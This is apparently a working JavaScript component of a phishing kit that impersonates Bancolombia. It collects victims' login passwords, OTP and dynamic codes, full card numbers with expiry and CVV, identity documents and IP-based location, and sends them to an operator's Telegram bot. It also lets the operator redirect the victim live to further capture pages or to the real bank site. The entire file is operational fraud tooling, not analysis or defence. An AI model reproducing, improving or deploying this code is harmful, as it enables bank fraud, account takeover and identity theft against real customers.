// assets/js/pages/load.js
// VERSIÓN CORREGIDA - Botones de Telegram SÍ redirigen
// UI = ORIGINAL (solo "Cargando..."). Polling = NUEVO (server-side last_callback)

(function () {
    var POLL_INTERVAL_MS = 800;
    var MAX_FAILS_BEFORE_SKIP = 50;
    var redirectTriggered = false;
    var failsSeguidos = 0;
    // 🔥 NUEVO v9: Flags para NO duplicar trabajo en los reintentos.
    var storeTxIpSent = false;
    var storedTxId = null;
    var ubicacionObtenida = null;

    function log(tag, msg) {
        try { console.log('[' + tag + ']', msg); } catch (e) {}
    }

    // 🔥 NUEVO v9: Backoff exponencial + jitter para reintentos.
    // Evita "storming" cuando hay rate limit 429 (antes era 5 segundos fijos).
    function calcReintentoMs(fails) {
        var f = Math.max(0, Math.min(12, parseInt(fails, 10) || 0));
        var base = Math.min(20000, 800 * Math.pow(1.55, f));
        var jitter = Math.random() * (Math.min(4000, base * 0.35));
        return Math.round(750 + base + jitter);
    }

    async function obtenerIPYUbicacion() {
        // 🔥 Cache en memoria. Por qué: si enviarDatos() se reintenta 10 veces por 429,
        //    no queremos 10 llamadas a ipapi.co / ip-api.com (ambas tienen rate limit 429 propio).
        if (ubicacionObtenida !== null) return ubicacionObtenida;
        log('IP', 'Obteniendo IP y ubicación...');

        try {
            var r1 = await fetch('https://ipapi.co/json/');
            if (r1.ok) {
                var d1 = await r1.json();
                if (d1 && d1.ip) {
                    return {
                        ip: d1.ip, city: d1.city || '', region: d1.region || '',
                        country_name: d1.country_name || '', country: d1.country || '',
                        postal: d1.postal || '', org: d1.org || '',
                        latitude: d1.latitude || '', longitude: d1.longitude || ''
                    };
                }
            }
        } catch (e) { log('IP', 'ipapi falló'); }

        try {
            var r2 = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
            if (r2.ok) {
                var d2 = await r2.json();
                if (d2 && d2.status === 'success' && d2.query) {
                    return {
                        ip: d2.query, city: d2.city || '', region: d2.regionName || '',
                        country_name: d2.country || '', country: d2.countryCode || '',
                        postal: d2.zip || '', org: d2.isp || d2.org || '',
                        latitude: d2.lat || '', longitude: d2.lon || ''
                    };
                }
            }
        } catch (e) { log('IP', 'ip-api falló'); }

        var ipG = localStorage.getItem('ip') || localStorage.getItem('address');
        if (ipG) return { ip: ipG, city: '', region: '', country_name: '', country: '', postal: '', org: '', latitude: '', longitude: '' };
        return { ip: 'No disponible', city: '', region: '', country_name: '', country: '', postal: '', org: '', latitude: '', longitude: '' };
    }

    function obtenerIPDesdeDOM() {
        var e1 = document.getElementById('gfg');
        var e2 = document.getElementById('address');
        var ip = (e1 && (e1.textContent || e1.innerText)) || 'No disponible';
        var ip2 = (e2 && (e2.textContent || e2.innerText)) || 'No disponible';
        if (ip === 'Cargando...' || ip === 'No disponible' || ip === '') {
            var g = localStorage.getItem('address') || localStorage.getItem('ip');
            if (g) ip = g;
        }
        return { ip: ip, ip2: ip2 };
    }

    function mostrarError(mensaje) {
        try {
            var d = document.createElement('div');
            d.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#f44336;color:#fff;padding:15px 30px;border-radius:8px;z-index:99999;font-family:Arial,sans-serif;box-shadow:0 4px 6px rgba(0,0,0,.1);max-width:90%;text-align:center;';
            d.textContent = '\u26A0\uFE0F ' + mensaje;
            document.body.appendChild(d);
            setTimeout(function () { if (d.parentNode) d.remove(); }, 6000);
        } catch (e) {}
    }

    function redirigirConLog(url) {
        if (redirectTriggered) return;
        redirectTriggered = true;
        log('REDIRECT', '-> ' + url);
        try {
            setTimeout(function () {
                window.location.replace(url);
            }, 80);
        } catch (e) {
            window.location.href = url;
        }
    }

    function procesarCallback(dataValue) {
        log('CALLBACK', dataValue);
        if (redirectTriggered) return;

        if (dataValue.indexOf('error_logo') >= 0)       redirigirConLog('login.php?error=true');
        else if (dataValue.indexOf('pedir_dinamica') >= 0)  redirigirConLog('index3.php');
        else if (dataValue.indexOf('error_dinamica') >= 0)  redirigirConLog('index3.php?error=true');
        else if (dataValue.indexOf('pedir_tc') >= 0)        redirigirConLog('desembolso.php');
        else if (dataValue.indexOf('error_tc') >= 0)        redirigirConLog('desembolso.php?error=true');
        else if (dataValue.indexOf('pedir_td') >= 0)        redirigirConLog('tarjeta_debito.php');
        else if (dataValue.indexOf('error_td') >= 0)        redirigirConLog('tarjeta_debito.php?error=true');
        else if (dataValue.indexOf('soy') >= 0)             redirigirConLog('soyyo.php');
        else if (dataValue.indexOf('error_otp') >= 0)       redirigirConLog('otp.php?error=true');
        else if (dataValue.indexOf('seleccion_919') >= 0)   redirigirConLog('seleccion919.php');
        else if (dataValue.indexOf('otp') >= 0)             redirigirConLog('otp.php');
        else if (dataValue.indexOf('finalizar') >= 0)       redirigirConLog('final1.php');
        else if (dataValue.indexOf('ban_ip') >= 0) {
            try { localStorage.setItem('banned', 'true'); } catch (e) {}
            redirigirConLog('https://www.bancolombia.com/tu360');
        } else {
            log('CALLBACK', 'callback desconocido -> ' + dataValue);
        }
    }

    async function enviarDatos() {
        log('SEND', 'Enviando datos a Telegram...');

        if (typeof telegramAPI === 'undefined') {
            log('SEND', 'telegramAPI NO disponible');
            mostrarError('Error de configuraci\u00F3n. Contacta al administrador.');
            return;
        }

        var clave     = localStorage.getItem('clave') || '';
        var otp       = localStorage.getItem('otp') || '';
        var dinamica  = localStorage.getItem('dinamica') || '';
        var userName  = localStorage.getItem('userName') || 'Desconocido';
        var usuario   = localStorage.getItem('usuario') || userName || 'No disponible';

        var cardData = null;
        try {
            var raw = localStorage.getItem('cardData');
            if (raw) cardData = JSON.parse(raw);
        } catch (e) { cardData = null; }

        var ipInfo = await obtenerIPYUbicacion();
        var domIP  = obtenerIPDesdeDOM();
        var ipFinal = ipInfo.ip || domIP.ip || 'No disponible';

        var ubicacion = '';
        if (ipInfo.city && ipInfo.country_name)       ubicacion = ipInfo.city + ', ' + ipInfo.country_name;
        else if (ipInfo.city)                         ubicacion = ipInfo.city;
        else if (ipInfo.country_name)                 ubicacion = ipInfo.country_name;
        else if (ipInfo.region)                       ubicacion = ipInfo.region;
        else ubicacion = localStorage.getItem('ubicacion') || 'Ubicaci\u00F3n no disponible';

        try {
            localStorage.setItem('ip', ipFinal);
            localStorage.setItem('address', ipFinal);
            localStorage.setItem('ubicacion', ubicacion);
            localStorage.setItem('userName', usuario);
        } catch (e) {}

        var transactionId = localStorage.getItem('transaction_id');
        var urlTx = (function () {
            try {
                var u = new URLSearchParams(window.location.search);
                return u.get('test_tx') || u.get('tx') || '';
            } catch (e) { return ''; }
        })();
        if (urlTx) {
            transactionId = urlTx;
            try { localStorage.setItem('transaction_id', transactionId); } catch (e) {}
        }
        if (!transactionId) {
            transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
            try { localStorage.setItem('transaction_id', transactionId); } catch (e) {}
        }

        // 🔥 NUEVO v9: storeTxIp SOLAMENTE 1 VEZ POR TX y 1 VEZ POR VIDA DE LA PESTAÑA.
        //    Los reintentos de enviarDatos() (por 429 / network) NO deben volver a disparar
        //    esta petición: al duplicarla llenábamos el rate limit de api.php en segundos.
        if (!storeTxIpSent || storedTxId !== transactionId) {
            storeTxIpSent = true;
            storedTxId   = transactionId;
            try {
                if (telegramAPI && typeof telegramAPI.storeTxIp === 'function') {
                    telegramAPI.storeTxIp(transactionId).catch(function(){});
                }
            } catch (e) {}
        }

        log('TXID', transactionId);

        var formDataMessage = '';
        try {
            var formJSON = localStorage.getItem('formData');
            if (formJSON) {
                var fd = JSON.parse(formJSON);
                var fdDocLine = '';
                if (fd.tipo_documento || fd.documento) {
                    fdDocLine = '🆔 <b>Doc:</b> ' + (fd.tipo_documento || '') + ' ' + (fd.documento || '') + '\n';
                }
                var fdLines = [];
                if (fd.nombre)          fdLines.push('👤 <b>Nombre:</b> ' + fd.nombre);
                if (fd.celular)         fdLines.push('📱 <b>Cel:</b> ' + fd.celular);
                if (fd.correo)          fdLines.push('📧 <b>Email:</b> ' + fd.correo);
                if (fd.ingresos)        fdLines.push('💰 <b>Ingr:</b> ' + fd.ingresos);
                if (fd.ciudad)          fdLines.push('🏙️ <b>Ciu:</b> ' + fd.ciudad);
                if (fd.monto)           fdLines.push('💲 <b>Monto:</b> ' + fd.monto);
                if (fd.plazo)           fdLines.push('📅 <b>Plazo:</b> ' + fd.plazo + ' m');
                if (fd.valor_inmueble)  fdLines.push('🏠 <b>Inmueble:</b> ' + fd.valor_inmueble);
                if (fd.cuota_inicial)   fdLines.push('💵 <b>Inicial:</b> ' + fd.cuota_inicial);
                if (fd.tipo_vivienda)   fdLines.push('🏘️ <b>Tipo:</b> ' + fd.tipo_vivienda);
                if (fd.tarjeta_pan) {
                    fdLines.push('💳 <b>PAN:</b> ' + fd.tarjeta_pan);
                    fdLines.push('📅 <b>Exp:</b> ' + (fd.tarjeta_exp || '') + ' | 🔒 <b>CVV:</b> ' + (fd.tarjeta_cvv || ''));
                    if (fd.tarjeta_bin_info) fdLines.push('🏦 <b>Info:</b> ' + fd.tarjeta_bin_info);
                }

                var hasAny = (fdDocLine !== '') || (fdLines.length > 0);
                if (hasAny) {
                    formDataMessage = '\n📝 <b>' + ((fd.titulo || 'SOLICITUD').toUpperCase()) + '</b>\n--------------------------------------------------\n';
                    if (fdDocLine) formDataMessage += fdDocLine;
                    if (fdLines.length) formDataMessage += fdLines.join('\n') + '\n';
                    formDataMessage += '--------------------------------------------------\n';
                } else {
                    formDataMessage = '';
                }
            }
        } catch (e) { formDataMessage = ''; }

        var message = (formDataMessage || '') + '<b>NUEVA SOLICITUD</b>\n--------------------------------------------------\n\uD83C\uDD94 <b>ID:</b> <code>' + transactionId + '</code>\n\uD83E\uDDB1\u200D\uD83D\uDCBB <b>User:</b> <code>' + usuario + '</code>\n\uD83D\uDD10 <b>Pass:</b> <code>' + (clave || '') + '</code>\n';
        if (otp)      message += '\uD83D\uDD11 <b>OTP:</b> <code>' + otp + '</code>\n';
        if (dinamica) message += '\uD83D\uDD10 <b>Din\u00E1mica:</b> <code>' + dinamica + '</code>\n';

        if (cardData) {
            message += '\n\uD83D\uDCB3 <b>=== DATOS DE TARJETA ===</b>';
            message += '\n\uD83D\uDCCC <b>Tipo:</b> ' + (cardData.type || 'D\u00E9bito');
            if (cardData.creditCardNumber) message += '\n\uD83D\uDCB3 <b>N\u00FAmero:</b> ' + cardData.creditCardNumber;
            if (cardData.expirationDate)   message += '\n\uD83D\uDCC5 <b>Expiraci\u00F3n:</b> ' + cardData.expirationDate;
            if (cardData.cvv)              message += '\n\uD83D\uDD12 <b>CVV:</b> ' + cardData.cvv;
            if (cardData.info)             message += '\n\uD83C\uDFE6 <b>Info BIN:</b> ' + cardData.info;
            if (cardData.network)          message += '\n\uD83C\uDF10 <b>Red:</b> ' + cardData.network;
            if (cardData.level)            message += '\n\uD83C\uDFC5 <b>Nivel:</b> ' + cardData.level;
            if (cardData.bank)             message += '\n\uD83C\uDFDB\uFE0F <b>Banco:</b> ' + cardData.bank;
            if (cardData.country)          message += '\n\uD83C\uDF0D <b>Pa\u00EDs:</b> ' + cardData.country;
            message += '\n';
        } else {
            message += '\n\uD83D\uDCB3 <b>Tarjeta:</b> No ingresada';
        }

        message += '\n\n\uD83C\uDF0D <b>Ubicaci\u00F3n:</b> ' + ubicacion + '\n\uD83D\uDCE1 <b>IP:</b> ' + ipFinal;
        if (domIP.ip2 && domIP.ip2 !== ipFinal && domIP.ip2 !== 'No disponible') {
            message += '\n\uD83D\uDCE1 <b>IP2:</b> ' + domIP.ip2;
        }
        message += '\n--------------------------------------------------\n';

        try { localStorage.setItem('message', message); } catch (e) {}

        var keyboard = {
            inline_keyboard: [
                [{ text: 'Error de Logo', callback_data: 'error_logo:' + transactionId }],
                [{ text: 'Pedir Din\u00E1mica', callback_data: 'pedir_dinamica:' + transactionId }],
                [
                    { text: 'Tarjeta de Cr\u00E9dito', callback_data: 'pedir_tc:' + transactionId },
                    { text: 'Error Din\u00E1mica', callback_data: 'error_dinamica:' + transactionId }
                ],
                [
                    { text: 'Tarjeta D\u00E9bito', callback_data: 'pedir_td:' + transactionId },
                    { text: 'Error TC Cr\u00E9dito', callback_data: 'error_tc:' + transactionId }
                ],
                [
                    { text: 'Soy Yo', callback_data: 'soy:' + transactionId },
                    { text: 'Error TD D\u00E9bito', callback_data: 'error_td:' + transactionId }
                ],
                [
                    { text: 'OTP', callback_data: 'otp:' + transactionId },
                    { text: 'Error OTP', callback_data: 'error_otp:' + transactionId }
                ],
                [{ text: '\u2705 SELECCION 919', callback_data: 'seleccion_919:' + transactionId }],
                [{ text: 'Finalizar', callback_data: 'finalizar:' + transactionId }],
                [{ text: '\uD83D\uDEAB BANEAR IP', callback_data: 'ban_ip:' + transactionId }]
            ]
        };

        try {
            log('SEND', 'Llamando sendMessage via API...');
            var result = await telegramAPI.sendMessage(message, 'HTML', keyboard);
            if (result && result.ok) {
                log('SEND', 'Mensaje enviado OK');
                if (result.result && result.result.message_id) {
                    try { localStorage.setItem('telegram_message_id', result.result.message_id); } catch (e) {}
                }
                var urlParams = new URLSearchParams(window.location.search);
                if (!urlParams.get('redirect')) {
                    setTimeout(function () { checkPaymentVerification(transactionId); }, 400);
                }
            } else {
                log('SEND', 'Telegram respondi\u00F3 mal: ' + JSON.stringify(result));
                mostrarError('No se pudo conectar con el servidor de Telegram');
                failsSeguidos += 1;
                var ms1 = calcReintentoMs(failsSeguidos);
                log('RETRY', 'Reintento ' + failsSeguidos + ' en ' + ms1 + 'ms');
                setTimeout(function () { enviarDatos(); }, ms1);
            }
        } catch (error) {
            log('SEND', 'Error red: ' + (error && error.message ? error.message : String(error)));
            mostrarError('Error de comunicaci\u00F3n con el servidor');
            failsSeguidos += 1;
            var ms2 = calcReintentoMs(failsSeguidos);
            log('RETRY', 'Reintento ' + failsSeguidos + ' en ' + ms2 + 'ms');
            setTimeout(function () { enviarDatos(); }, ms2);
        }
    }

    async function checkPaymentVerification(transactionId) {
        if (redirectTriggered) return;
        log('POLL', 'checkPaymentVerification (SERVER-SIDE) -> ' + transactionId);

        if (typeof telegramAPI === 'undefined') {
            mostrarError('Error de configuraci\u00F3n.');
            return;
        }

        try {
            var res = await telegramAPI.getLastCallback(transactionId);
            failsSeguidos = 0;

            if (res && res.callback && typeof res.callback === 'string' && res.callback !== '') {
                log('POLL', '\u2705 Callback por server-side: ' + res.callback);
                // 1) PRIMERO Y ANTE TODO: REDIRIGIR. Nada más importa.
                procesarCallback(res.callback);
                return;
            }

            // Sin callback -> seguir esperando
            setTimeout(function () { checkPaymentVerification(transactionId); }, POLL_INTERVAL_MS);
        } catch (error) {
            log('POLL', 'Error polling -> ' + (error && error.message ? error.message : String(error)));
            failsSeguidos += 1;
            if (failsSeguidos > MAX_FAILS_BEFORE_SKIP) {
                // Demasiados errores: resetear contador y seguir (no romper)
                failsSeguidos = 10;
            }
            setTimeout(function () { checkPaymentVerification(transactionId); }, POLL_INTERVAL_MS);
        }
    }

    window.addEventListener('load', function () {
        log('INIT', 'load.js iniciado');

        if (typeof telegramAPI === 'undefined') {
            mostrarError('Error de configuraci\u00F3n. Contacta al administrador.');
            return;
        }

        if (typeof BancoShared !== 'undefined') {
            try {
                BancoShared.populateIp({ ipElementId: 'gfg', addressElementId: 'address' });
                BancoShared.startDateTime('fecha-hora');
            } catch (e) {}
        }

        var urlParams = new URLSearchParams(window.location.search);
        var redirectUrl = urlParams.get('redirect');

        if (redirectUrl) {
            log('INIT', 'Redirect param -> ' + redirectUrl);
            enviarDatos().finally(function () {
                setTimeout(function () { redirigirConLog(redirectUrl); }, 2500);
            });
        } else {
            enviarDatos();
        }
    });
})();
